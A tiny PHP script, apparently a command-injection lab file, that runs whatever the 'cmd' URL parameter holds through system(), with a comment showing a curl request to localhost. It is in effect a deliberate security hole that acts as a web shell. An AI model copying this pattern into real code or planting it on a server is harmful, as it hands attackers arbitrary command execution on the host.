<?php 
// curl -gki "http://localhost:8000/3_cmd.php?cmd=ls"

$cmd=$_GET['cmd'] ?? '' ;
if ($cmd){
    system("echo Listing: && $cmd");
}